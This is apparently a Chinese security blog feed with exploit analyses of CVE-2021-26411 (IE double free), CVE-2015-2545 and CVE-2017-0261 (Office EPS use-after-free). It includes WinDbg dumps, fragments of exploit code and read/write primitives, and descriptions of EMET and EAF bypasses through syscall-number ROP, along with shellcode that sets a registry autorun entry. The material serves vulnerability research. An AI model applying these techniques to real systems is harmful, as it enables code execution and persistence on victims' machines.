<span class="nx">write</span><span class="p">(</span><span class="nx">read</span><span class="p">(</span><span class="nx">addrOf</span><span class="p">(</span><span class="nx">hd0</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</code></pre></div></div>

<p>执行hd0.nodeValue = alloc后，此时的hd2.nodeValue读写原语会被dic1.items()替换，并赋值给hd0.nodeValue：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec91c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)	//hd0.nodeValue = alloc
0:009&gt; p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec908=05cec8e0
0:009&gt; dd 0943b5b4-4	//dic1.items()已经占据了hd2.nodeValue的内存空间
0943b5b0  0000200c 00000000 06ff1320 00000000
0943b5c0  00000009 00000000 0963cd44 00000000
0943b5d0  00000009 00000000 09649004 00000000
0943b5e0  00000003 00000000 12341234 00000000
0943b5f0  00000003 00000000 12341234 00000000
0943b600  00000003 00000000 12341234 00000000
0943b610  00000003 00000000 12341234 00000000
0943b620  00000003 00000000 12341234 00000000
</code></pre></div></div>

<p>随后创建hd2.nodeValue的Uint32Array leak，该数组的作用就是将fake和arr数组的内存地址泄露出来，pAbf存放的是fake，pArr存放的是arr：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec8c4={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}
0:009&gt; p
eax=0c564010 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000001 edi=00000001
eip=73869e6e esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec8b0=05cec888
0:009&gt; dd 0943b5b4-4	//hd2.nodeValue
0943b5b0  0000200c 00000000 06ff1320 00000000
0943b5c0  00000009 00000000 0963cd44 00000000	//fake
0943b5d0  00000009 00000000 09649004 00000000	//arr
0943b5e0  00000003 00000000 12341234 00000000
0943b5f0  00000003 00000000 12341234 00000000
0943b600  00000003 00000000 12341234 00000000
0943b610  00000003 00000000 12341234 00000000
0943b620  00000003 00000000 12341234 00000000
0:009&gt; dd 0963cd44 L8
0963cd44  73705654 73705638 7370562c 73705610
0963cd54  0963fed0 05d40888 00000000 00000002
0:009&gt; dd 0963fed0 L9	//该处正是fake的内存地址
0963fed0  7370514c 08dcc8c0 00000000 00000000
0963fee0  00000000 00000000 00000000 05d4d338
0963fef0  00000100
</code></pre></div></div>

<p>继续执行到flush()处，原本的abf已经存放了fake所在的内存结构：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec538 ebp=05cec5a0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec588={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//flush()
0:009&gt; dd 963ff00 L9	//abf
0963ff00  7370514c 08dcc8c0 00000000 00000000
0963ff10  00000000 095f8ee0 0c770460 05d61fe8
0963ff20  00020010
0:009&gt; dd 05d61fe8 L11*4	//abf中的内容，其中abf[1]中存放的值就是fake
05d61fe8  00000000 00000000 00000000 00000000
05d61ff8  00004003 00000000 0963cd44 00000000
05d62008  00004003 00000000 0963cd48 00000000
05d62018  00004003 00000000 0963cd4c 00000000
05d62028  00004003 00000000 0963cd50 00000000
05d62038  00004003 00000000 0963cd54 00000000
05d62048  00004003 00000000 0963cd58 00000000
05d62058  00004003 00000000 0963cd5c 00000000
05d62068  00004003 00000000 0963cd60 00000000
05d62078  00004003 00000000 0963cd64 00000000
05d62088  00004003 00000000 0963cd68 00000000
05d62098  00004003 00000000 0963cd6c 00000000
05d620a8  00004003 00000000 0963cd70 00000000
05d620b8  00004003 00000000 0963cd74 00000000
05d620c8  00004003 00000000 0963cd78 00000000
05d620d8  00004003 00000000 0963cd7c 00000000
05d620e8  00004003 00000000 0963cd80 00000000
0:009&gt; dd poi(0963cd44+10) L9	//fake
0963fed0  7370514c 08dcc8c0 00000000 00000000
0963fee0  00000000 09609100 00000000 05d4d338
0963fef0  00000100
</code></pre></div></div>

<p>当执行到var ref = new VBArray(hd0.nodeValue)时，查看hd0的内存，发现hd0.nodeValue已经被abf覆盖：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e413ed6 ebx=00ebd201 ecx=7209f6b0 edx=00400040 esi=02000001 edi=00000001
eip=73869e6b esp=05cec7b0 ebp=05cec810 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec7f8={MSHTML!CFastDOM::CNode::Trampoline_cloneNode (7209f6b0)}
0:009&gt; g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec8c4={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}	//var ref = new VBArray(hd0.nodeValue)
0:009&gt; dd 05387200 L10	//hd0
05387200  715961ec 00000001 00000001 00000008
05387210  00000000 00000000 0a2f9cf0 00000000
05387220  ffffffff 093b32c4 0000200c 00000000
05387230  06ff1680 00000000 05382370 00000000
0:009&gt; du 093b32c4 
093b32c4  "handle"
0:009&gt; dd 06ff1680 L4
06ff1680  08800001 00000010 00000000 0943b5b0
0:009&gt; dd 0943b5b0		//hd0.nodeValue
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00004003 00000000 0963cd44 00000000
0943b5d0  00004003 00000000 0963cd48 00000000
0943b5e0  00004003 00000000 0963cd4c 00000000
0943b5f0  00004003 00000000 0963cd50 00000000
0943b600  00004003 00000000 0963cd54 00000000
0943b610  00004003 00000000 0963cd58 00000000
0943b620  00004003 00000000 0963cd5c 00000000
</code></pre></div></div>

<p>随后通过setData方法将abf[1]构造成一个ArrayBuffer结构，获取abf[1]到god中，执行到god = new DataView(ref.getItem(1))时，abf的内存结构如下：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-2-12_22-17-41.png" alt="" /></p>

<p>write-what-where读写原语构造完毕，随后通过该读写原语获取函数地址，调用最终实现利用。</p>

<h1 id="总结">总结</h1>

<p>此次利用的手法和之前分析过的word EPS文件漏洞十分相似，EPS和JS都是脚本语言，共同点都是通过UAF来覆盖释放后的内存结构，构造一段读写原语，再通过读写原语写入构造好的write-what-where字符串的结构。通过write-what-where字符串便可以轻松实现函数的获取和调用了。</p>

<p>不同点在于JS对象和EPS的对象结构在内存的布局不同，导致利用时需要了解JS对象的内存布局后才能构造出write-what-where字符串，在EPS中的利用手法如绕过EMET的R3HOOK和EAF可以在IE漏洞中复用。</p>

<p>此次分析大部分的时间花在对各种JS对象内存结构的寻找上，经过查找资料和手动调试，对于ArrayBuffer、Element、Attribute等结构有了深入的了解，下次在分析有这些对象参与的POC和EXP时可以快速的定位到这些对象的内存，同时也找到了对象内置函数的调用位置，可以快速定位代码执行位置和执行结果。</p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[漏洞信息 CVE：CVE-2021-26411 IE版本：IE 9-11 漏洞类型：Double free 漏洞模块：MSHTML.dll]]></summary></entry><entry><title type="html">CVE-2015-2545 EMET Bypass分析</title><link href="http://localhost:4000/2021-11-19/CVE-2015-2545" rel="alternate" type="text/html" title="CVE-2015-2545 EMET Bypass分析" /><published>2021-11-19T00:00:00+08:00</published><updated>2021-11-19T00:00:00+08:00</updated><id>http://localhost:4000/2021-11-19/CVE-2015-2545</id><content type="html" xml:base="http://localhost:4000/2021-11-19/CVE-2015-2545"><![CDATA[<h1 id="前言">前言</h1>

<p>该漏洞和上次分析的CVE-2017-0261为同一类型，同样是EPS文件解析产生的UAF漏洞，因此在分析时就不再讲解EPS的语法和相关结构了。分析该漏洞是因为样本能够完全绕过EMET，故此深入分析下绕过的原理并改造CVE-2017-0261绕过EMET。<!--more--></p>

<h2 id="调试环境">调试环境</h2>

<p>调试是直接在Office2007上进行调试，调试环境如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS:			Win7 x64 SP1
Office:		    	Ofiice 2007 x86
Image name: 		EPSIMP32.FLT
ImageSize:        	0x0006E000
File version:     	2006.1200.4518.1014
样本hash：	        375e51a989525cfec8296faaffdefa35
</code></pre></div></div>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="漏洞成因">漏洞成因</h2>

<p>在分析之前说明下dict对象的结构：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116160424215.png" alt="image-20211116160424215" /></p>

<p>查看eps文件，漏洞触发代码如图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909161555356.png" alt="image-20210909161555356" /></p>

<p>forall操作符遍历dict对象，在执行过程中使用copy将一个新的dict对象拷贝到正在遍历的dict对象中，此时原本的dict对象将会被释放。接着通过构造特殊结构的字符串对象，覆盖被释放的dict对象的结构，导致在第二次遍历dict的对象时去获取了构造好的字符串对象，这样便产生了一个有限大小的读写原语。</p>

<p>在windbg中定位到forall操作符的代码，查看此时操作栈的对象可以发现xx_41为遍历的对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909161900919.png" alt="image-20210909161900919" /></p>

<p>接着定位到copy操作符所在位置，查看此时操作栈的情况可以得知xx_41将会被xx_18467覆盖：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909162334445.png" alt="image-20210909162334445" /></p>

<p>继续深入分析，到图中所示执行操作符delete位置时，查看参数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909170805435.png" alt="image-20210909170805435" /></p>

<p>经过分析可以发现eax的值正是xx_41中的keyZ1:</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909172455780.png" alt="image-20210909172455780" /></p>

<p>查看keyZ1，正是Dict_Object对象，里面储存的为0x1000大小的array对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116161548995.png" alt="image-20211116161548995" /></p>

<p>当执行完delete后，keyZ1所占有的内存被释放，随后一直循环delete直到整个xx_41的内容全部被释放。</p>

<p>执行完copy后，查看操作栈中发现xx_41的内容已经变成xx_18467：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909195153651.png" alt="image-20210909195153651" /></p>

<p>当执行到putinterval时，可以看到由于创建的字符串大小为35(0x23)，实际会分配0x24大小的结构用于存储字符串，而该大小正是dict对象结构的大小。因此当keyZ2被释放后，此时再次创建一个0x24大小的字符串将会占用keyZ2的内存空间：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909203306735.png" alt="image-20210909203306735" /></p>

<p>forall第二次要取的值仍为原来的keyZ2，但此时keyZ2指向的内存已经被故意构造的字符串占用，导致了UAF：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909204254869.png" alt="image-20210909204254869" /></p>

<p>当forall执行第二遍时，此时将把故意构造的字符串当作dict对象获取到操作栈中，key和value会被压入栈中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210910094751189.png" alt="image-20210910094751189" /></p>

<p>最终xx_26500获取了字符串，xx_19169获取了整数，从xx_26500的结构可以看出构造了一个大小为0x2710的读写原语：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116101956346.png" alt="image-20211116101956346" /></p>

<p>漏洞原理部分分析完毕。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="构造读写原语">构造读写原语</h2>

<p>接下来参考上次分析的CVE-2017-0261的漏洞利用部分，尝试在了解漏洞原理的基础上自己构造读写原语，构造思路如下：</p>

<ol>
  <li>利用获取到的0x2710大小的xx_26500字符串对象构造指向string结构的0x30结构和0x28的string结构</li>
  <li>获取0x30结构和0x28结构的首地址，并使用两个地址指向首地址</li>
  <li>将构造好的读写原语的首地址放置在任意一个string对象的value2</li>
</ol>

<p>构造字符串结构很容易，但是要能获取到结构所在地址。因此在结构的位置上选取了xx_26500字符串中0xfc的位置，该位置存储的内容为指向后四个字节的地址可以准确的定位，因此将该值作为stringbase：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116163040737.png" alt="image-20211116163040737" /></p>

<p>接着开始构造指向string结构的0x30结构和0x28的string结构，通过putinterval操作符将构造好的结构放入stringbase+0xc的位置：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116180754750.png" alt="image-20211116180754750" /></p>

<p>将0x30结构的首地址放入stringbase中，0x28结构的首地址放入stringbase+4中，将stringbase+4的地址放入0x28结构的首地址0x24中，这样0x30结构就指向了0x28结构。具体的eps代码和结构如下图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211117192302813.png" alt="image-20211117192302813" /></p>

<p>构造好读写原语的相关结构后，就需要把结构首地址放置在任意一个string对象的value2后，这一步打算重复漏洞触发的过程，将构造好的读写原语的PostScript结构字符串覆盖原本正常的dict结构，最终获得了一个能够读写任意内存的读写原语：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118103740956.png" alt="image-20211118103740956" /></p>

<h2 id="emet-bypass分析">EMET Bypass分析</h2>

<p>样本在构造ROP这里开始Bypass EMET，不像一般的ROP直接调用VirtualProtect来修改内存属性，而是调用ZwProtectVirtualMemory。但是EMET对ZwProtectVirtualMemory进行hook，因此不能直接调用。样本获取到ZwProtectVirtualMemory的地址后会往后遍历，当遍历到retn后计数加一，直到遍历到没有被hook的函数后获取该函数的调用号，将调用号减去retn计数就得到了ZwProtectVirtualMemory原本的调用号：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118200720456.png" alt="image-20211118200720456" /></p>

<p>通过ROP将调用号赋值给eax，之后再通过调用未被hook的ZwCreateEvent函数的后5个字节直接调用ZwProtectVirtualMemory修改shellcode的内存：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118203213331.png" alt="image-20211118203213331" /></p>

<p>可以看到此时ZwProtectVirtualMemory是被hook的，而通过这种方式则完美绕过了hook：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118204947902.png" alt="image-20211118204947902" /></p>

<p>然而只绕过hook是不够的，需要shellcode绕过EAF，样本通过fs:[0]获取SEH链拿到msvcrt.dll的句柄，随后通过回退搜索MZ头寻找msvcrt.dll的基地址。通过msvcrt.dll的导入表获取函数地址并最终将shellcode后的PE文件写入到本地文件中并启动：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118211034227.png" alt="image-20211118211034227" /></p>

<h2 id="利用手法移植">利用手法移植</h2>

<p>在了解了样本的绕过思路后，在CVE-2017-0261上尝试绕过EMET。</p>

<p>首先将原本获取VirtualProtect的地址改为获取NtProtectVirtualMemory和NtCreateEvent：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118212457524.png" alt="image-20211118212457524" /></p>

<p>随后修改ROP链直接通过ZwProtectVirtualMemory的调用号调用ZwCreateEvent+0x5的位置修改内存属性，成功绕过了EMET：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211119115826229.png" alt="image-20211119115826229" /></p>

<p>shellcode由于样本采用了PE文件落地的方式，容易被查杀，因此修改shellcode采取syscall的方式直接写注册表自启项，最终成功绕过了EAF：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211119140836753.png" alt="image-20211119140836753" /></p>

<h1 id="总结">总结</h1>

<p>CVE-2015-2545是EPS文件解析类的首个漏洞，CVE-2016-0261无论是在漏洞触发和漏洞利用上都和该漏洞十分相似，连辅助函数都基本和2545保持一致。不同的是该样本通过syscall绕过了EMET对于关键函数的hook，这种绕过的思路可以应用在其他具有能读写任意内存的读写原语的漏洞中。同时shellcode也与传统的从PEB结构直接获取kernerl32.dll的基地址不同，通过SEH链获取msvcrt.dll的基地址在获取导入表函数地址绕过EAF，这种利用都是值得借鉴的。</p>

<h1 id="参考链接">参考链接</h1>

<p>[1] <a href="https://bbs.pediy.com/thread-216046.htm">野外的 CVE-2015-2545 逃逸了 EMET</a></p>

<p>[2] <a href="https://paper.seebug.org/368/">CVE-2015-2545 Word 利用样本分析</a></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 该漏洞和上次分析的CVE-2017-0261为同一类型，同样是EPS文件解析产生的UAF漏洞，因此在分析时就不再讲解EPS的语法和相关结构了。分析该漏洞是因为样本能够完全绕过EMET，故此深入分析下绕过的原理并改造CVE-2017-0261绕过EMET。]]></summary></entry><entry><title type="html">CVE-2017-0261 EPS文件解析漏洞分析</title><link href="http://localhost:4000/2021-09-07/CVE-2017-0261" rel="alternate" type="text/html" title="CVE-2017-0261 EPS文件解析漏洞分析" /><published>2021-09-07T00:00:00+08:00</published><updated>2021-09-07T00:00:00+08:00</updated><id>http://localhost:4000/2021-09-07/CVE-2017-0261</id><content type="html" xml:base="http://localhost:4000/2021-09-07/CVE-2017-0261"><![CDATA[<h1 id="前言">前言</h1>

<p>第一次分析EPS类漏洞，对于PostScript格式十分陌生，通过查阅<a href="https://www.adobe.com/content/dam/acom/en/devnet/actionscript/articles/PLRM.pdf">PostScript LANGUAGE REFERENCE</a>了解PostScript格式。调试EXP来自kcufld师傅的<a href="https://github.com/kcufId/eps-CVE-2017-0261">eps-CVE-2017-0261</a>，EXP在Office 2007可以正常运行，但在Office 2010以上版本需要配合提权漏洞逃逸沙箱后完成利用。<!--more--></p>

<h2 id="调试环境">调试环境</h2>

<p>调试是直接使用kcufld师傅的eps加载器进行调试，EPSIMP32.FLT版本信息如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS:			Win7 x64 SP1
Office:		    	Ofiice 2007 x86
Image name: 		EPSIMP32.FLT
ImageSize:        	0x0006E000
File version:     	2006.1200.4518.1014
Product version:  	2006.1200.4518.0
</code></pre></div></div>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="postscript格式简介">PostScript格式简介</h2>

<p>先介绍下PostScript基本的数据结构：</p>

<table>
  <thead>
    <tr>
      <th>SIMPLE OBJECTS</th>
      <th>COMPOSITE OBJECTS</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>boolean</td>
      <td>array</td>
    </tr>
    <tr>
      <td>fontID</td>
      <td>dictionary</td>
    </tr>
    <tr>
      <td>integer</td>
      <td>file</td>
    </tr>
    <tr>
      <td>mark</td>
      <td>gstate (LanguageLevel 2)</td>
    </tr>
    <tr>
      <td>name</td>
      <td>packedarray (LanguageLevel 2)</td>
    </tr>
    <tr>
      <td>null</td>
      <td>save</td>
    </tr>
    <tr>
      <td>operator</td>
      <td>string</td>
    </tr>
    <tr>
      <td>real</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>左侧为简单对象，右侧为复合对象。简单对象都是原子实体，类型、属性和值不可逆转地结合在一起，不能改变。但复合对象的值与对象本身是分开的，对象本身存储于操作栈中，具体的结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// PostScript Object
struct PostScript object
{
    dword    type;		//对象类型		
    dword    attr;		
    dword    value1;	//指向对象所属变量名称
    dword    value2;	//若为简单对象，直接指向值；若为复合对象，指向存储的值的结构
}ps_obj;
</code></pre></div></div>

<p>其中部分type的值与类型的映射如下：</p>

<table>
  <thead>
    <tr>
      <th>type值</th>
      <th>数据类型</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0x0</td>
      <td>nulltype</td>
    </tr>
    <tr>
      <td>0x3</td>
      <td>integertype</td>
    </tr>
    <tr>
      <td>0x5</td>
      <td>realtype</td>
    </tr>
    <tr>
      <td>0x8</td>
      <td>booleantype</td>
    </tr>
    <tr>
      <td>0x10</td>
      <td>operatortype</td>
    </tr>
    <tr>
      <td>0x20</td>
      <td>marktype</td>
    </tr>
    <tr>
      <td>0x40</td>
      <td>savetype</td>
    </tr>
    <tr>
      <td>0x300</td>
      <td>nametype</td>
    </tr>
    <tr>
      <td>0x500</td>
      <td>stringtype</td>
    </tr>
    <tr>
      <td>0x900</td>
      <td>filetype</td>
    </tr>
    <tr>
      <td>0x30000</td>
      <td>arraytype</td>
    </tr>
    <tr>
      <td>0x70000</td>
      <td>packedarraytype</td>
    </tr>
    <tr>
      <td>0x0B0000</td>
      <td>packedarraytype</td>
    </tr>
    <tr>
      <td>0x110000</td>
      <td>dicttype</td>
    </tr>
    <tr>
      <td>0x210000</td>
      <td>gstatetype</td>
    </tr>
  </tbody>
</table>

<p>接着介绍下漏洞中使用到的比较关键的操作符的意义：</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">操作符</th>
      <th style="text-align: left">示例</th>
      <th style="text-align: left">解析</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">forall</td>
      <td style="text-align: left">array  proc  forall</td>
      <td style="text-align: left">枚举第一个操作数的元素，为每个元素执行过程 proc。如果第一个操作数是数组、压缩数组或字符串对象，则 forall 将一个元素压入操作数堆栈，并对对象中的每个元素执行 proc，从索引为 0 的元素开始并依次执行。</td>
    </tr>
    <tr>
      <td style="text-align: left">dup</td>
      <td style="text-align: left">any  dup —&gt; any  any</td>
      <td style="text-align: left">复制操作数堆栈上的顶部元素。 dup 只复制对象；复合对象的值不是复制而是共享的。</td>
    </tr>
    <tr>
      <td style="text-align: left">putinterval</td>
      <td style="text-align: left">array1  index  array2  putinterval</td>
      <td style="text-align: left">用第三个操作数的全部内容替换第一个操作数的元素的子序列。被替换的子序列从第一个操作数的 index 开始；它的长度与第三个操作数的长度相同。</td>
    </tr>
    <tr>
      <td style="text-align: left">put/get</td>
      <td style="text-align: left">array  index  any  put/get</td>
      <td style="text-align: left">替换/获取第一个操作数的一个元素的值。如果第一个操作数是一个数组或一个字符串，put/get将第二个操作数视为一个索引，并将第三个操作数存储在索引所确定的位置，从0开始计算。</td>
    </tr>
    <tr>
      <td style="text-align: left">save</td>
      <td style="text-align: left">/save save</td>
      <td style="text-align: left">保存当前VM状态快照，一个快照只能使用一次。</td>
    </tr>
    <tr>
      <td style="text-align: left">restore</td>
      <td style="text-align: left">save restore</td>
      <td style="text-align: left">丢弃本地VM中自相应保存以来创建的所有对象，并回收它们占用的内存；将本地VM中所有复合对象的值（字符串除外）重置为保存时的状态；关闭自相应保存以来打开的文件，只要这些文件在local VM 分配模式有效时打开。</td>
    </tr>
  </tbody>
</table>

<p>了解了上述背景后，开始分析漏洞。</p>

<h2 id="漏洞成因">漏洞成因</h2>

<p>通过使用forall操作符获取创建的字符串对象，并在第一次循环时使用restore操作符释放字符串对象，随后创建新的字符串对象使得原本存储旧字符串对象的结构被新复合对象代替。若故意构造大小为0x27的字符串对象，则字符串被释放后会多出0x28的内存空间，此时立即创建新的字符串对象，则该内存会用来存储指向新字符串的string结构。随后通过改变forall的函数，获取指向新字符串的结构。</p>

<p>漏洞文件中一共触发了三次漏洞，第一次是获取了被释放的string的字符用于判断系统是32位还是64位。第二次触发故意构造大小为0x27的string对象，用于获取指向恶意string的结构。第三次则利用第二次构造的特殊string结构创造了一个起始地址为0x00000000，大小为0x7fffffff的字符串，构造了能够读写任意地址内存的读写原语。接着利用读写原语搜索内存中函数地址构造ROP链。最终创建了一个文件对象，在调用closefile操作符时跳转执行ROP完成漏洞利用。</p>

<p>查看poc.eps文件，第一次调用forall如图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903105452944.png" alt="image-20210903105452944" /></p>

<p>在ida中定位到forall操作符的代码：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210902173157063.png" alt="image-20210902173157063" /></p>

<p>使用windbg找到对应偏移后下断：<code class="language-plaintext highlighter-rouge">sxe ld EPSIMP32;g;bp EPSIMP32+2b928;g;</code></p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831150138806.png" alt="image-20210831150138806" /></p>

<p>运行到图中所示位置时查看edi的值，指向了操作栈，查看后发现有两个对象在栈中，第一个为string l63，第二个为array l61</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210910180510699.png" alt="image-20210910180510699" /></p>

<p>继续分析，会获取l63和l61对象到栈中，并确认l63的类型为string后，跳转到获取string类型元素部分</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831161042602.png" alt="image-20210831161042602" /></p>

<p>获取值的过程会因为type的不同而有所变化，具体如图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901172253284.png" alt="image-20210901172253284" /></p>

<p>通过调试可以更加直观的看到通过value2获取string的方式：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831171553055.png" alt="image-20210831171553055" /></p>

<p>接着循环获取string中的每一个元素并执行函数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831192324185.png" alt="image-20210831192324185" /></p>

<p>此时传入deferred_exec的参数为eax，查看传入参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; bp EPSIMP32+2ba06          //call    deferred_exec
0:000&gt; g
Breakpoint 1 hit
eax=0018fd78 ebx=00000000 ecx=00291280 edx=00000001 esi=00425770 edi=00000000
eip=718fba06 esp=0018fd54 ebp=0018fdbc iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
EPSIMP32!RegisterPercentCallback+0x4604:
718fba06 e8d8abffff      call    deferred_exec (718f65e3)
0:000&gt; dd eax L4        //查看传入的参数为数组
0018fd78  00030000 00000000 0049ea98 0048f40c
0:000&gt; dd poi(poi(poi(poi(poi( 0018fd78 +c))+24))+28)   //查看数组中存储的内容
0049e2c0  00000500 00000100 00495408 0048ee98			//数组中存放着字符串对象
0049e2d0  12d85688 8000f194 00000020 00000100
